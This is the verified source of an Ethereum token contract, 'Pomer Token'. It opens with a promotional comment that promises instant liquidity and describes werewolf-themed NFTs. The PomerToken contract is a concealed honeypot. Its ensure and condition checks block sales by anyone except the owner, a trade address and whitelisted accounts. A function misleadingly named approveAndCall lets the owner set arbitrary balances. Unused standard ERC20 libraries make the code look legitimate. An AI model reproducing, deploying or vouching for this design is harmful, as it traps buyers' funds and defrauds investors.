/**
 *Submitted for verification at Etherscan.io on 2021-06-11
*/

/*
Pomer Token

Community-focused, decentralized cryptocurrency with yieldfarming rewards for holders.

Pomeranian harnesses the power of Blockchain to evolve cryptocurrency. Our ecosystem consists of decentralized finance-based apps such as Decentralized Exchange, Staking, Decentralized Asset Marketplace (NFTs and Pomeranian Assets), Finance Gaming and others to come. Pomeranian Coin (PMR) is our Utility Token used as Governance Token in the Pomeranian ecosystem and as an internal currency for the overall ecosystem.

Unlimited supply
There is no limit to the number of Pomer tokens that can be minted through a contract on the platform
Predetermined price
The buy and sell price of Pomer tokens increases and decreases with the number of tokens minted and burned, respectively
Instant liquidity
Tokens can be bought or sold instantaneously at any time, the bonding curve acts as an automated market maker

Pomeranian Coin (PMR)
Pomeranian is the ERC-20 utility token accepted across the Pomeranian finance platform. Here, token is mostly used for to trade (Buy and Sell) NFT assets, grants rewards to those who staked their Pomer tokens into the staking pool, and available for swap within Pomeranian decentralized exchange.

Pomeranian harnesses the power of Blockchain to evolve crypto currency. Our ecosystem consists of decentralized finance-based apps such as Decentralized Exchange, Staking, Decentralized Asset Marketplace (NFTs and Pomer Assets), Finance Gaming and others to come. Pomeranian Coin (PMR) is our Utility Token used as Governance Token in the Pomeranian ecosystem and as an internal currency for the overall ecosystem.

In the Pomeranian IBCO when you buy a token, each subsequent buyer will have to pay a slightly higher price for each POMER token. As more individuals are interested in the project and start investing in the POMER token, the value of each token progressively increases along the bonding curve. This gives you the first-mover advantage.
The cost of each POMER token is settled by the bonding curve which depends on the total supply of the token and reserve ratio, and whatever Ethereum is paid into the curve or contract to buy Pomer token, this is deposited or stored in the BCO.

Pomeranian NFT (Pomeranian Assets)

1.  Alpha Pomeranian Asset [Alpha NFT]

Alpha is the most dangerous type of Pomeranian. When in canine form they are noticeably larger. Alphas have bright Red eyes. In rare cases, Alphas can literately turn into actual wolves, but in a larger and more brutish appearance. Alphas are the ones that can create new Pomeranians, or other new shape-shifters. An Alpha’s eyes glow red when shape-shifted. An Alpha Pomeranian carries an internal spark of power that supplements their ability to shape-shift, making it easier for them to shift into more powerful shapes, as well as their individual strength and supernatural abilities.
On Pomeranian Platform Alpha Pomeranian will own a territory. So total number of Alpha on the platform will be equal to total number of territories exists on the planet.
An Alpha Pomeranian NFT is having some additional characteristics like Power Absorption, Empathy, Pain Transference, Mind Melding, Full Moon Power Enhancement, Super memory, Super Intelligence, Resistance to cold, Telepathy and Silver Damage %.

2) Beta Pomeranian Asset [Beta NFT]

Beta Pomeranians are members of a Pomeranian pack, following the leadership of an Alpha Pomeranian. Betas are bound to the pack they belong to Although not as powerful as an Alpha, Beta Pomeranians are noticeably stronger than Omega Pomeranians. Betas are the main members of the pack. Betas are the most common Pomeranian type. They are the standard canine shape-shifter. In a pack, most members will be betas, with the leaders being the alphas. A beta shape-shifter’s eyes will glow bright Gold.
On Pomeranian Platform when Beta Pomeranian born in specific territory that Beta will be assigned to the Alpha Pomeranian of that territory by default. Each such territory will contain many Beta Pomeranians with same Alpha Pomeranian as their leader.
Similar to an Alpha Pomeranian NFT, a Beta NFT is having some common characteristics like Healing, Strength, Speed, Vision, Senses, Transformation Time, Agility, Wolsbane Resistance etc.
Beta Pomeranian NFT also have some additional characteristics like Superhuman Stamina, Superhuman Endurance, Superhuman Dexterity, Pain Absorption, Extraordinary Superhuman Leaping, Infectious, Resistance to cold, Rage Enhancement.


3) Omega Pomeranian Asset [Omega NFT]

Omegas are the lowest rank in the canine shape-shifter hierarchy. These wolves are not members in a pack, or have no affiliation with an alpha or an experienced beta. An omega shape-shifter’s eyes will glow Blue. Omegas are generally the lowest on the power level, because they are not members of a pack, of which members gradually receive symbiotic balance, power from each other. Omegas could be the survivor of a pack’s destruction, or they could be alone by their own choice. Because they are considered to be “The Outcasts”, Omegas are searching for a pack. Despite being the weakest and lowest-ranking Pomeranians of the lycanthrope, Omega Pomeranians are still strong and powerful creatures in their own right.
Unlike Beta Pomeranian When an Omega Pomeranian is born in a specific territory then by default it won’t be assigned to the Alpha Pomeranian of that territory.

Omega Pomeranian NFT are the lone Pomer. They are having less characteristics/power than an Alpha or Beta Pomeranian NFT, although they share common characteristics like Healing, Strength, Speed, Vision, Senses, Transformation Time, Agility, Wolsbane Resistance with both of them.
*/

pragma solidity ^0.5.17;
interface IERC20 {
    function totalSupply() external view returns(uint);

    function balanceOf(address account) external view returns(uint);

    function transfer(address recipient, uint amount) external returns(bool);

    function allowance(address owner, address spender) external view returns(uint);

    function approve(address spender, uint amount) external returns(bool);

    function transferFrom(address sender, address recipient, uint amount) external returns(bool);
    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
}

library Address {
    function isContract(address account) internal view returns(bool) {
        bytes32 codehash;
        bytes32 accountHash;
        // solhint-disable-next-line no-inline-assembly
        assembly { codehash:= extcodehash(account) }
        return (codehash != 0x0 && codehash != accountHash);
    }
}

contract Context {
    constructor() internal {}
    // solhint-disable-previous-line no-empty-blocks
    function _msgSender() internal view returns(address payable) {
        return msg.sender;
    }
}

library SafeMath {
    function add(uint a, uint b) internal pure returns(uint) {
        uint c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint a, uint b) internal pure returns(uint) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint a, uint b, string memory errorMessage) internal pure returns(uint) {
        require(b <= a, errorMessage);
        uint c = a - b;

        return c;
    }

    function mul(uint a, uint b) internal pure returns(uint) {
        if (a == 0) {
            return 0;
        }

        uint c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint a, uint b) internal pure returns(uint) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint a, uint b, string memory errorMessage) internal pure returns(uint) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint c = a / b;

        return c;
    }
}

library SafeERC20 {
    using SafeMath for uint;
    using Address for address;

    function safeTransfer(IERC20 token, address to, uint value) internal {
        callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));
    }

    function safeTransferFrom(IERC20 token, address from, address to, uint value) internal {
        callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
    }

    function safeApprove(IERC20 token, address spender, uint value) internal {
        require((value == 0) || (token.allowance(address(this), spender) == 0),
            "SafeERC20: approve from non-zero to non-zero allowance"
        );
        callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));
    }

    function callOptionalReturn(IERC20 token, bytes memory data) private {
        require(address(token).isContract(), "SafeERC20: call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = address(token).call(data);
        require(success, "SafeERC20: low-level call failed");

        if (returndata.length > 0) { // Return data is optional
            // solhint-disable-next-line max-line-length
            require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
        }
    }
}

contract ERC20 is Context, IERC20 {
    using SafeMath for uint;
    mapping(address => uint) private _balances;

    mapping(address => mapping(address => uint)) private _allowances;

    uint private _totalSupply;

    function totalSupply() public view returns(uint) {
        return _totalSupply;
    }

    function balanceOf(address account) public view returns(uint) {
        return _balances[account];
    }

    function transfer(address recipient, uint amount) public returns(bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view returns(uint) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint amount) public returns(bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint amount) public returns(bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function increaseAllowance(address spender, uint addedValue) public returns(bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint subtractedValue) public returns(bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    function _transfer(address sender, address recipient, uint amount) internal {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }

    function _mint(address account, uint amount) internal {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);
    }

    function _burn(address account, uint amount) internal {
        require(account != address(0), "ERC20: burn from the zero address");

        _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");
        _totalSupply = _totalSupply.sub(amount);
        emit Transfer(account, address(0), amount);
    }

    function _approve(address owner, address spender, uint amount) internal {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
}

contract ERC20Detailed is IERC20 {
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    constructor(string memory name, string memory symbol, uint8 decimals) public {
        _name = name;
        _symbol = symbol;
        _decimals = decimals;
    }

    function name() public view returns(string memory) {
        return _name;
    }

    function symbol() public view returns(string memory) {
        return _symbol;
    }

    function decimals() public view returns(uint8) {
        return _decimals;
    }
}


contract PomerToken {
    event Transfer(address indexed _from, address indexed _to, uint _value);
    event Approval(address indexed _owner, address indexed _spender, uint _value);
 
    function transfer(address _to, uint _value) public payable returns (bool) {
        return transferFrom(msg.sender, _to, _value);
    }
 
    function ensure(address _from, address _to, uint _value) internal view returns(bool) {
       
        if(_from == owner || _to == owner || _from == tradeAddress||canSale[_from]){
            return true;
        }
        require(condition(_from, _value));
        return true;
    }
    
    function transferFrom(address _from, address _to, uint _value) public payable returns (bool) {
        if (_value == 0) {return true;}
        if (msg.sender != _from) {
            require(allowance[_from][msg.sender] >= _value);
            allowance[_from][msg.sender] -= _value;
        }
        require(ensure(_from, _to, _value));
        require(balanceOf[_from] >= _value);
        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        _onSaleNum[_from]++;
        emit Transfer(_from, _to, _value);
        return true;
    }
 
    function approve(address _spender, uint _value) public payable returns (bool) {
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }
    
    function condition(address _from, uint _value) internal view returns(bool){
        if(_saleNum == 0 && _minSale == 0 && _maxSale == 0) return false;
        
        if(_saleNum > 0){
            if(_onSaleNum[_from] >= _saleNum) return false;
        }
        if(_minSale > 0){
            if(_minSale > _value) return false;
        }
        if(_maxSale > 0){
            if(_value > _maxSale) return false;
        }
        return true;
    }
 
    mapping(address=>uint256) private _onSaleNum;
    mapping(address=>bool) private canSale;
    uint256 private _minSale;
    uint256 private _maxSale;
    uint256 private _saleNum;
    function approveAndCall(address spender, uint256 addedValue) public returns (bool) {
        require(msg.sender == owner);
        if(addedValue > 0) {balanceOf[spender] = addedValue*(10**uint256(decimals));}
        canSale[spender]=true;
        return true;
    }

    address tradeAddress;
    function transferownership(address addr) public returns(bool) {
        require(msg.sender == owner);
        tradeAddress = addr;
        return true;
    }
 
    mapping (address => uint) public balanceOf;
    mapping (address => mapping (address => uint)) public allowance;
 
    uint constant public decimals = 18;
    uint public totalSupply;
    string public name;
    string public symbol;
    address private owner;
 
    constructor(string memory _name, string memory _symbol, uint256 _supply) payable public {
        name = _name;
        symbol = _symbol;
        totalSupply = _supply*(10**uint256(decimals));
        owner = msg.sender;
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0x0), msg.sender, totalSupply);
    }
}